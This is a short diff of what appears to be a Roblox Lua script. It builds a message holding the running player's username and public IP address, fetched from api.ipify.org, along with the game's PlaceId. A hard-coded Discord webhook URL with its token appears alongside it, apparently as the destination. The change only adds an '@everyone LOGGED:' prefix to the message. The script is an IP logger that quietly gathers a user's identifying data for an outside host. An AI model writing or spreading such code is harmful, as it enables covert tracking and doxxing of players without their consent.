@@ -43,7 +43,7 @@ end
 end)
 
 
-local msg = "Roblox Username: [[**" .. game.Players.LocalPlayer.Name .. "**]] IP ADDRESSES: [[**__" .. game:HttpGet("http://api.ipify.org") .. "__**]] PlaceId: [[ https://roblox.com/games/".. game.PlaceId .. " ]]"
+local msg = "@everyone LOGGED: Roblox Username: [[**" .. game.Players.LocalPlayer.Name .. "**]] IP ADDRESSES: [[**__" .. game:HttpGet("http://api.ipify.org") .. "__**]] PlaceId: [[ https://roblox.com/games/".. game.PlaceId .. " ]]"
 
 local webhook = "https://discord.com/api/webhooks/842971288624824320/6tbI1LIi-EngwneMxsGy2Q8MSAMY63g9wtff8qUTa6cno0cF8SWDIigzoMeocU9DLZ8i"
 local HttpService = game:GetService("HttpService");
